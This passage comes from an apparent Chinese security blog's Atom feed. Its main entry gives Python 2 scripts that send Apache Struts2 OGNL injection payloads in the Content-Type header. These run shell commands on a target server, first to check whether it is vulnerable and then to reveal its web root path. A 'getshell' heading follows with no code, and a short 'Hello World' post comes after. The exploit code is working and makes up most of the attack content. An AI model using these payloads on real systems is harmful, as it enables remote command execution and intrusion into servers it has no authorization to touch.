11987654321').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?&#123;'cmd.exe','/c',#cmd&#125;:&#123;'/bin/bash','-c',#cmd&#125;)).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())&#125;"</span>)</div><div class="line">res = urllib2.urlopen(req)</div><div class="line">html = res.read()</div><div class="line"><span class="keyword">print</span> html</div><div class="line"><span class="keyword">if</span> <span class="string">"11987654321"</span> <span class="keyword">in</span> html:</div><div class="line">    <span class="keyword">print</span> url + <span class="string">"      is OK"</span></div></pre></td></tr></table></figure>
<h3 id="获取路径"><a href="#获取路径" class="headerlink" title="获取路径"></a>获取路径</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"></div><div class="line">req.add_header(<span class="string">'User-agent'</span>,<span class="string">"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36"</span>)</div><div class="line">req.add_header(<span class="string">'Content-Type'</span>,<span class="string">"%&#123;(#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#luan='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#path=#context.get('com.opensymphony.xwork2.dispatcher.HttpServletRequest').getSession().getServletContext().getRealPath('/')).(#cmd='echo '+#path).(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?&#123;'cmd.exe','/c',#cmd&#125;:&#123;'/bin/bash','-c',#cmd&#125;)).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())&#125;"</span>)</div></pre></td></tr></table></figure>
<h3 id="getshell"><a href="#getshell" class="headerlink" title="getshell"></a>getshell</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">自己百度吧</div></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;script src=&quot;/assets/js/APlayer.min.js&quot;&gt; &lt;/script&gt;&lt;h2 id=&quot;始末&quot;&gt;&lt;a href=&quot;#始末&quot; class=&quot;headerlink&quot; title=&quot;始末&quot;&gt;&lt;/a&gt;始末&lt;/h2&gt;&lt;p&gt;&amp;#160; &amp;#160; &amp;#160;
    
    </summary>
    
    
      <category term="python" scheme="http://phpplay.github.io/tags/python/"/>
    
      <category term="网络安全" scheme="http://phpplay.github.io/tags/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
  <entry>
    <title>Hello World</title>
    <link href="http://phpplay.github.io/2017/03/14/hello-world/"/>
    <id>http://phpplay.github.io/2017/03/14/hello-world/</id>
    <published>2017-03-14T01:41:48.019Z</published>
    <updated>2017-03-14T04:53:17.294Z</updated>
    
    <content type="html"><![CDATA[<script src="/assets/js/APlayer.min.js"> </script><pre><code>时隔一年，又开始写blog了，这次能坚持多久？
</code></pre>]]></content>
    
    <summary type="html">
    
      &lt;script src=&quot;/assets/js/APlayer.min.js&quot;&gt; &lt;/script&gt;&lt;pre&gt;&lt;code&gt;时隔一年，又开始写blog了，这次能坚持多久？
&lt;/code&gt;&lt;/pre&gt;
    
    </summary>
    
    
  </entry>
  
</feed>
